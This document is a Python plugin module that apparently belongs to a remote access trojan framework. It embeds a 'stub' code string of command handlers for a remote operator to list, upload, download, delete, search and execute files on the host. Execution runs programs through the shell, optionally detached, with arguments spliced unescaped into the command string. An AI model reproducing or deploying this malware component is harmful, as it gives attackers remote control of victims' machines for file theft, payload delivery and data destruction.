PLUGIN = {"name": "file_manager", "desc": "File manager: browse, upload, download, delete, execute, search", "deps": [], "size": 2.0}

STUB_CODE = r"""
def _cmd_ls(m):
    try:
        items = []
        for e in os.scandir(m.get("path", ".")):
            try:
                st = e.stat()
                items.append({"name": e.name, "type": "dir" if e.is_dir() else "file",
                              "size": st.st_size if e.is_file() else 0,
                              "mtime": st.st_mtime if hasattr(st, "st_mtime") else 0})
            except: pass
        return {"path": os.path.abspath(m.get("path", ".")), "items": items}
    except Exception as e: return {"error": str(e)}

def _cmd_upload(m):
    try:
        os.makedirs(os.path.dirname(m["path"]), exist_ok=True)
        with open(m["path"], "wb") as f: f.write(base64.b64decode(m["data"]))
        return {"output": f"[+] Uploaded to {m['path']}"}
    except Exception as e: return {"output": f"[!] Upload failed: {e}"}

def _cmd_download(m):
    try:
        with open(m["path"], "rb") as f: return {"data": base64.b64encode(f.read()).decode()}
    except Exception as e: return {"error": str(e)}

def _cmd_delete(m):
    try:
        p = m["path"]
        if os.path.isdir(p):
            import shutil
            shutil.rmtree(p)
        else:
            os.remove(p)
        return {"output": f"[+] Deleted: {p}"}
    except Exception as e: return {"output": f"[!] Delete failed: {e}"}

def _cmd_execute(m):
    try:
        p = m["path"]
        args = m.get("args", "")
        wait = m.get("wait", False)
        cmd = f'"{p}" {args}'.strip()
        if wait:
            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=int(m.get("timeout", 30)))
            out = r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
            return {"output": out[:5000] if out else f"[+] Executed (exit={r.returncode})"}
        else:
            subprocess.Popen(cmd, shell=True, close_fds=True)
            return {"output": f"[+] Started: {p}"}
    except subprocess.TimeoutExpired: return {"output": "[!] Execution timed out"}
    except Exception as e: return {"output": f"[!] Execute failed: {e}"}

def _cmd_search(m):
    try:
        root = m.get("path", ".")
        pattern = m.get("pattern", "*")
        max_results = min(m.get("max", 50), 200)
        results = []
        try:
            import fnmatch
            count = 0
            for r, dirs, files in os.walk(root):
                for f in files:
                    if fnmatch.fnmatch(f, pattern):
                        fp = os.path.join(r, f)
                        try:
                            sz = os.path.getsize(fp)
                            results.append({"path": fp, "size": sz})
                            count += 1
                            if count >= max_results: break
                        except: pass
                if count >= max_results: break
        except: pass
        if not results: return {"output": f"[!] No files matching '{pattern}' in {root}"}
        lines = [f"[+] Found {len(results)} files:"]
        for r in results[:30]:
            lines.append(f"  {r['size']:>10,} B  {r['path'][:120]}")
        if len(results) > 30: lines.append(f"  ... and {len(results)-30} more")
        return {"output": "\n".join(lines), "files": results}
    except Exception as e: return {"output": f"[!] Search error: {e}"}

_CMDS["ls"] = _cmd_ls
_CMDS["upload"] = _cmd_upload
_CMDS["download"] = _cmd_download
_CMDS["delete"] = _cmd_delete
_CMDS["execute"] = _cmd_execute
_CMDS["search"] = _cmd_search
"""

def get_commands():
    return {"ls": "_cmd_ls", "upload": "_cmd_upload", "download": "_cmd_download",
            "delete": "_cmd_delete", "execute": "_cmd_execute", "search": "_cmd_search"}
